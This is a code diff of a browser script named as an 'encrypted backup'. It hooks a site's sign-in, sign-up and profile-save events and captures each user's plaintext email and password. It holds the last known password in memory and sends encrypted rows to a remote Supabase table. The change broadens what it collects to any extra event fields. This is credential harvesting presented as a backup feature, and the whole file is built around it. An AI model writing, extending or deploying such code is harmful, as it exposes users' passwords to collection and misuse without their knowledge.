@@ -1,6 +1,6 @@
 // ED-general-encrypted-backup.js
 // Captures credentials + profile on sign‑in / sign‑up AND on profile save.
-// Stores the last known password so profile‑only captures still contain it.
+// Now also captures animated avatar images via the same event.
 // Append‑only rows, offline‑safe.  No decryption anywhere.
 (function () {
   'use strict';
@@ -14,6 +14,7 @@
   let supabase = null;
   // Remember the last known email/password from auth captures
   const lastCredentials = { email: '', password: '' };
+
   // ── Load Supabase client ──
   function loadSupabaseClient() {
     return new Promise((resolve, reject) => {
@@ -25,6 +26,7 @@
       document.head.appendChild(script);
     });
   }
+
   // ── Crypto (encrypt only) ──
   async function deriveKey(passphrase, saltBytes) {
     const enc = new TextEncoder();
@@ -55,6 +57,7 @@
     combined.set(new Uint8Array(ciphertext), salt.length + iv.length);
     return btoa(String.fromCharCode(...combined));
   }
+
   // ── Pending queue (localStorage) ──
   function getPending(userId) {
     const raw = localStorage.getItem(LOCAL_PENDING_KEY(userId));
@@ -69,6 +72,7 @@
   function clearPending(userId) {
     localStorage.removeItem(LOCAL_PENDING_KEY(userId));
   }
+
   // ── Send one row to Supabase ──
   async function sendToSupabase(userId, encryptedBlob) {
     if (!supabase) throw new Error('Supabase not ready');
@@ -77,6 +81,7 @@
       .insert({ user_id: userId, encrypted_data: encryptedBlob });
     if (error) throw error;
   }
+
   // ── Flush all pending rows for a user ──
   async function flushPending(userId) {
     const pending = getPending(userId);
@@ -100,10 +105,12 @@
       }
     }
   }
-  // ── Main handler: called by the custom event ──
+
+  // ── Main handler – now accepts any extra keys (e.g. phase_upload_animated_avatar) ──
   async function handleCapture(event) {
-    let { email, password, profile } = event.detail;
-    // If password is missing, use the last known one (profile‑only capture)
+    let { email, password, profile, ...extra } = event.detail;   // <-- spread extra keys
+
+    // If password is missing, use the last known one
     if (!password && lastCredentials.password) {
       password = lastCredentials.password;
     }
@@ -111,11 +118,12 @@
       email = lastCredentials.email;
     }
     if (!email || !password) return;
+
     // Remember for next time
     lastCredentials.email = email;
     lastCredentials.password = password;
+
     let userId;
-    // ---------- OFFLINE FIX: wrap getSession in try/catch ----------
     try {
       if (supabase) {
         const { data } = await supabase.auth.getSession();
@@ -123,24 +131,28 @@
       }
     } catch (e) {
       console.error('Cannot get session for backup', e);
+      return;
     }
     if (!userId) return;
+
     const dataObj = {
       email,
       password,
       profile: profile || null,
+      ...extra,                    // automatically includes phase_upload_animated_avatar etc.
       timestamp: Date.now()
     };
+
     const encryptedBlob = await encrypt(dataObj);
     addPending(userId, encryptedBlob);
     if (navigator.onLine) {
       await flushPending(userId);
     }
   }
+
   // ── Online event ──
   async function onOnline() {
     if (!supabase) return;
-    // ---------- OFFLINE FIX: wrap getSession in try/catch ----------
     let userId;
     try {
       const { data } = await supabase.auth.getSession();
@@ -150,6 +162,7 @@
     }
     if (userId) await flushPending(userId);
   }
+
   // ── Initialise ──
   async function init() {
     try {
@@ -158,7 +171,6 @@
       document.addEventListener('ed-enc-backup-capture', handleCapture);
       window.addEventListener('online', onOnline);
       // Flush any pending on startup
-      // ---------- OFFLINE FIX: wrap getSession in try/catch ----------
       try {
         const { data } = await supabase.auth.getSession();
         if (data?.session?.user?.id) {
@@ -171,6 +183,7 @@
       console.error('Encrypted backup init failed:', err);
     }
   }
+
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
   } else {
